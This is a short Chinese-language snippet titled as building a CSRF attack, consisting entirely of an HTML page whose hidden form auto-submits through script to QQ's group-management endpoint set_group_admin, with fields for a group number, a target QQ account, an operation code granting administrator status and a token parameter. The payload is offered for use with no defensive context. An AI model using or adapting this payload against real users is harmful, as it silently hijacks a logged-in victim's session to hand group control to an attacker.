构造csrf：



<html>



<form name="comer"  action="http://qun.qq.com/cgi-bin/qun_mgr/set_group_admin

" method="POST"> 



<input type="hidden" name="gc" value="QQ群号" />



<input type="hidden" name="ul" value="QQ号码" />





<input type="hidden" name="op" value="1(给予1的待遇，也就是管理员，第一位)" />





<input type="hidden" name="bkn" value="1495574789 (随机参数)" />





<input type="submit" />



</form>



<script>



document.comer.submit();



</script>



</html>
